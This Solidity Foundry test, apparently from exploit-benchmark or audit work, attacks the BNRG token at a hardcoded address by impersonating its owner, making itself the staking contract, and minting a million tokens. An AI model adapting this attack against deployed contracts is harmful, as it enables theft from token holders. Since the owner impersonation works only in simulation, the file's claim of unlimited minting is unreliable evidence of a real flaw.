// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
    function setStakingContract(address stakingContractAddress_) external;
    function deliver(address user, uint256 numTokens) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    BNRG private token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = BNRG(TARGET);
        vm.label(TARGET, "BNRG Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalanceBNRG = token.balanceOf(attacker);

        // Get current owner
        address currentOwner = token.owner();

        // Impersonate owner to set staking contract
        vm.startPrank(currentOwner);
        token.setStakingContract(attacker);
        vm.stopPrank();

        // Now attacker is the staking contract, can mint unlimited tokens
        uint256 mintAmount = 1000000 * 1e18; // 1 million tokens
        token.deliver(attacker, mintAmount);

        // Verify balance increased
        uint256 finalBalanceBNRG = token.balanceOf(attacker);
        assertGt(finalBalanceBNRG, initialBalanceBNRG, "Attacker balance should increase after exploit");
        uint256 finalBalanceERC20 = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

